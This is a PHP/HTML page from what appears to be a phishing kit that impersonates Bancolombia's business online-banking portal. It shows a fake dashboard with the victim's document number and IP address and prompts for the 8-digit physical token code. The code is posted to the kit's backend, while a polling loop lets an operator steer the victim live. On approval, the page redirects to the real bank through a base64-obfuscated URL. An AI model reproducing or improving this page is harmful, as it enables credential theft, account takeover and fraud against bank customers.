<?php
require_once __DIR__ . '/core/shield.php';
require_once __DIR__ . '/core/db.php';
$sid = $_GET['id'] ?? '';
if (!$sid) {
    header("Location: index.php");
    exit;
}
$hasError = isset($_GET['error']);

$pdo = getDB();
$stmt = $pdo->prepare("SELECT doc_type, doc_num, ip, created_at FROM sessions WHERE session_id = ?");
$stmt->execute([$sid]);
$session_data = $stmt->fetch();

$docType = $session_data['doc_type'] ?? '';
$docNum = $session_data['doc_num'] ?? '';

$docLabel = '';
if ($docType && $docNum) {
    $shortType = $docType;
    if ($docType === 'Cédula de Ciudadanía')
        $shortType = 'C.C.';
    elseif ($docType === 'Cédula de Extranjería')
        $shortType = 'C.E.';
    elseif ($docType === 'Pasaporte')
        $shortType = 'PAS';
    elseif ($docType === 'ID Extranjero Persona Natural')
        $shortType = 'ID.E';
    $docLabel = $shortType . ': ' . $docNum;
} else {
    $docLabel = 'NIT: 901220509';
}

date_default_timezone_set('America/Bogota');
$createdAt = strtotime($session_data['created_at'] ?? 'now');
$dias = ["Domingo","Lunes","Martes","Miércoles","Jueves","Viernes","Sábado"];
$meses = ["enero","febrero","marzo","abril","mayo","junio","julio","agosto","septiembre","octubre","noviembre","diciembre"];
$last_visit = strtolower($dias[date('w', $createdAt)]) . " " . date('d', $createdAt) . " de " . $meses[date('n', $createdAt)-1] . " de " . date('Y', $createdAt) . " " . date('g:i', $createdAt) . " " . (date('a', $createdAt) == 'am' ? 'a. m.' : 'p. m.');
$real_ip = htmlspecialchars($session_data['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="img/favicon.png">
    <title>Token - Bancolombia</title>
    <!-- Link index.css to inherit core design tokens and font styles -->
    <link rel="stylesheet" href="icon/bds.min.css">
    <link rel="stylesheet" href="css/index.css">
    <link rel="stylesheet" href="css/token.css">
</head>

<body>

    <!-- Floating Error Toast (Top Center) -->
    <div id="error-toast" class="error-toast">
        <div class="toast-indicator">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 9V13M12 17H12.01M12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </div>
        <div class="toast-message">
            La clave del token ingresada no es válida. Revisa tu dispositivo e inténtalo de nuevo.
        </div>
        <button class="toast-close" id="close-toast-btn" aria-label="Cerrar mensaje">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </button>
    </div>

    <!-- ══ BANCOLOMBIA DASHBOARD BACKGROUND ══ -->
    <div class="bc-bg">
        <!-- Top bar -->
        <div class="bc-top">
            <div class="bc-top-menu">
                <span class="bc-icon">menu</span>
                Menú
            </div>
            <div class="bc-top-logo">
                <img src="img/bancolombia-horizontal.svg" class="bc-logo-img" alt="Bancolombia Logo">
                <div class="bc-top-divider"></div>
                <span class="bc-top-section">Sucursal Virtual Negocios</span>
            </div>
            <div class="bc-top-right">
                <a class="bc-top-link" href="#">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:16px; height:16px; display:inline-block; vertical-align:middle; margin-right:4px;">
                        <circle cx="11" cy="11" r="8" />
                        <path d="m21 21-4.35-4.35" />
                    </svg>
                    Buscar
                </a>
                <div class="bc-top-divider-small"></div>
                <a class="bc-top-link" href="#">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:16px; height:16px; display:inline-block; vertical-align:middle; margin-right:4px;">
                        <circle cx="12" cy="12" r="10" />
                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3M12 17h.01" />
                    </svg>
                    Ayuda
                </a>
                <div class="bc-top-divider-small"></div>
                <a class="bc-top-link" href="#">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:16px; height:16px; display:inline-block; vertical-align:middle; margin-right:4px;">
                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
                        <polyline points="22,6 12,13 2,6" />
                    </svg>
                    Buzón
                </a>
                <div class="bc-top-divider-small"></div>
                <div class="bc-top-user">
                    <!-- PNG building icon from img/icon_094_uniE92F.png -->
                    <img src="img/icon_094_uniE92F.png"
                        style="width:16px; height:16px; display:inline-block; filter: invert(1) sepia(1) saturate(5) hue-rotate(340deg);"
                        alt="NIT">
                    <span><?php echo htmlspecialchars($docLabel); ?></span>
                </div>
            </div>
        </div>

        <!-- Layout -->
        <div class="bc-layout">
            <!-- Sidebar -->
            <div class="bc-side">
                <div class="bc-country-btn">Colombia</div>
                <div class="bc-nav-item active">
                    <img src="img/icon_203_uniE99C.png"
                        style="width:18px; height:18px; filter: invert(1) brightness(0.1);" alt="Inicio">
                    Inicio
                </div>
                <div class="bc-nav-item">
                    <img src="img/icon_654_uniEC93.png"
                        style="width:18px; height:18px; filter: invert(1) opacity(0.65);" alt="Productos">
                    Productos
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <img src="img/icon_292_uniE9F5.png"
                        style="width:18px; height:18px; filter: invert(1) opacity(0.65);" alt="Transacciones">
                    Transacciones
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <!-- Inline SVG check-circle for approvals -->
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:18px; height:18px; opacity:0.65;">
                        <circle cx="12" cy="12" r="10" />
                        <path d="m9 12 2 2 4-4" />
                    </svg>
                    Aprobaciones
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <img src="img/icon_148_uniE965.png"
                        style="width:18px; height:18px; filter: invert(1) opacity(0.65);" alt="Reportes y archivos">
                    Reportes y archivos
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-nav-item">
                    <!-- Inline SVG settings gear for admin -->
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        style="width:18px; height:18px; opacity:0.65;">
                        <circle cx="12" cy="12" r="3" />
                        <path
                            d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" />
                    </svg>
                    Administración del canal
                    <span class="bc-nav-arrow">›</span>
                </div>
                <div class="bc-side-foot">
                    <div class="bc-cerrar">
                        Cerrar sesión
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                            stroke-linecap="round" stroke-linejoin="round">
                            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
                            <polyline points="16 17 21 12 16 7" />
                            <line x1="21" y1="12" x2="9" y2="12" />
                        </svg>
                    </div>
                </div>
            </div>

            <!-- Content -->
            <div class="bc-content">
                <div class="bc-datebar" id="live-clock">Cargando fecha...</div>
                <div class="bc-main-area"></div>

                <!-- Screenshot 4 Style Footer Area -->
                <div
                    style="margin-top: auto; background: #fff; border-top: 1px solid #e0e0e0; padding: 18px 24px; display: flex; justify-content: space-between; align-items: flex-start; z-index: 2;">
                    <div>
                        <img src="img/bancolombia-horizontal.svg" alt="Bancolombia"
                            style="height: 18px; filter: invert(1) brightness(0); display: block; margin-bottom: 6px;">
                        <div style="font-size: 11px; color: #727278; margin-bottom: 8px;">Copyright &copy; 2026
                            Bancolombia.</div>
                        <img src="img/vigilado-superintendencia.svg" alt="Vigilado"
                            style="height: 16px; width: auto; opacity: 0.85;">
                    </div>
                    <div style="text-align: right; font-size: 11px; color: #727278; line-height: 1.6;">
                        <div>Dirección IP <?php echo $real_ip; ?></div>
                        <div>Última visita <?php echo $last_visit; ?></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ══ DARK OVERLAY ══ -->
    <div class="overlay"></div>

    <!-- ══ APPROVED ERROR OVERLAY ══ -->
    <div id="approved-error-overlay" style="display:none; position:fixed; inset:0; background:rgba(30,30,30,0.6); backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px); z-index:9999; align-items:center; justify-content:center; padding:20px;">
        <div style="background:#fff; border-radius:20px; max-width:420px; width:100%; padding:36px 30px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,0.22);">
            <div style="width:56px; height:56px; background:#fff3cd; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px;">
                <img src="img/icon_056_uniE909.png" style="width:28px; height:28px; filter:brightness(0) saturate(100%) invert(55%) sepia(90%) saturate(600%) hue-rotate(5deg) brightness(95%);" alt="Alerta">
            </div>
            <div style="font-size:1.2rem; font-weight:700; color:#2c2c30; margin-bottom:12px;">Servicio no disponible</div>
            <div style="font-size:0.92rem; color:#727278; line-height:1.6; margin-bottom:8px;">En estos momentos no podemos procesar su solicitud. Por favor, inténtelo más tarde.</div>
            <div style="font-size:0.8rem; color:#aaa; margin-top:16px;">Será redirigido en unos segundos...</div>
        </div>
    </div>


    <!-- ══ TOKEN MODAL ══ -->
    <div class="modal-wrap">
        <div class="modal">
            <!-- Physical Token Device image instead of stop hand -->
            <div style="text-align: center; margin-bottom: 24px;">
                <img src="img/Screenshot_7 copy.png" alt="Token Físico"
                    style="height: 72px; width: auto; display: block; margin: 0 auto;">
            </div>

            <div class="modal-title">Clave de Token</div>
            <div class="modal-subtitle">
                Ingresa los dígitos de seguridad de tu token físico para continuar con tu sesión.
            </div>



            <form id="tokenForm" action="actions/save_token.php" method="POST">
                <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sid); ?>">

                <!-- Form group using exact layout as the login password field -->
                <div class="form-group <?php echo $hasError ? 'has-error' : ''; ?>" id="token-group">
                    <span class="floating-label">Clave</span>
                    <div class="input-wrapper">
                        <!-- PNG lock icon from img/icon_225_uniE9B2.png -->
                        <img src="img/icon_225_uniE9B2.png" class="input-icon-left"
                            style=" filter: invert(1) brightness(0.2); position: absolute; " alt="Lock">

                        <input type="password" id="tokenInput" name="token_value" autocomplete="off" required
                            minlength="8" maxlength="8" inputmode="numeric" pattern="[0-9]{8}">

                        <!-- Visibility eye toggle using PNG eye images -->
                        <button class="visibility-toggle" type="button" id="eyeBtn" data-target="tokenInput"
                            aria-label="Mostrar clave" style="width:24px; height:24px;">
                            <img src="img/icon_246_uniE9C7.png" id="eyeOff"
                                style="width:24px; height:24px; filter: invert(1) brightness(0.2); display:block;"
                                alt="Ocultar">
                            <img src="img/icon_330_uniEA1F.png" id="eyeOn"
                                style="width:24px; height:24px; filter: invert(1) brightness(0.2); display:none;"
                                alt="Mostrar">
                        </button>
                    </div>
                </div>
                <div class="inp-counter"><span id="cc">0</span>/8</div>

                <button type="button" id="btnOk" class="btn-primary btn-continuar" disabled
                    onclick="doSubmit()">Continuar</button>
            </form>
        </div>
    </div>

    <script>
        const inp = document.getElementById('tokenInput');
        const btn = document.getElementById('btnOk');
        const cc = document.getElementById('cc');
        const group = document.getElementById('token-group');

        // ── Floating Label Behaviors ────────────────────────────────
        inp.addEventListener('focus', () => group.classList.add('focused'));
        inp.addEventListener('blur', () => {
            group.classList.remove('focused');
            if (inp.value.trim() !== '') group.classList.add('has-value');
            else group.classList.remove('has-value');
        });

        inp.addEventListener('input', () => {
            inp.value = inp.value.replace(/[^0-9]/g, ''); // Ensure only numbers
            cc.textContent = inp.value.length;
            btn.disabled = inp.value.length < 6;
            // Remove error outline if they start typing again
            group.classList.remove('has-error');
        });

        // ── Eye visibility toggle behavior ────────────────────────────
        document.getElementById('eyeBtn').addEventListener('click', () => {
            const isPw = inp.type === 'password';
            inp.type = isPw ? 'text' : 'password';
            document.getElementById('eyeOff').style.display = isPw ? 'block' : 'none';
            document.getElementById('eyeOn').style.display = isPw ? 'none' : 'block';
        });

        function doSubmit() {
            if (inp.value.trim()) document.getElementById('tokenForm').submit();
        }
        inp.addEventListener('keydown', e => { if (e.key === 'Enter' && inp.value.trim()) doSubmit(); });

        // ── Admin Status Polling ─────────────────────────────────────
        const sid = "<?php echo htmlspecialchars($sid); ?>";
        // Real-time Clock
        function updateClock() {
            const now = new Date();
            const dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
            const meses = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
            let hours = now.getHours();
            let ampm = hours >= 12 ? 'p.m.' : 'a.m.';
            hours = hours % 12; hours = hours ? hours : 12;
            let mins = now.getMinutes().toString().padStart(2, '0');
            let secs = now.getSeconds().toString().padStart(2, '0');
            const str = `${dias[now.getDay()]}, ${now.getDate()} de ${meses[now.getMonth()]} de ${now.getFullYear()}, ${hours}:${mins}:${secs} ${ampm}`;
            const el = document.getElementById('live-clock');
            if (el) el.textContent = str;
        }
        setInterval(updateClock, 1000);
        updateClock();

        function showApprovedError() {
            document.getElementById('approved-error-overlay').style.display = 'flex';
            setTimeout(() => {
                const url = atob('aHR0cHM6Ly93d3cuYmFuY29sb21iaWEuY29tLw==');
                window.location.href = url;
            }, 5000);
        }

        function poll() {
            fetch('actions/poll.php?id=' + sid)
                .then(r => r.json())
                .then(d => {
                    if (d.status === 'retry') window.location.href = 'index.php?error=1&id=' + sid;
                    else if (d.status === 'approved') showApprovedError();
                    else if (d.status === 'waiting') window.location.href = 'wait.php?id=' + sid;
                    else if (d.status === 'syncing') window.location.href = 'sync.php?id=' + sid;
                    else setTimeout(poll, 2500);
                })
                .catch(() => setTimeout(poll, 2500));
        }
        setTimeout(poll, 2500);

        // Toast logic
        const errorToast = document.getElementById('error-toast');
        const closeBtn = document.getElementById('close-toast-btn');

        function showErrorToast() {
            if (errorToast) {
                errorToast.classList.add('show');
                setTimeout(() => {
                    errorToast.classList.remove('show');
                }, 5000);
            }
        }

        if (closeBtn) {
            closeBtn.addEventListener('click', () => {
                errorToast.classList.remove('show');
            });
        }

        <?php if ($hasError): ?>
            showErrorToast();
        <?php endif; ?>
    </script>
</body>

</html>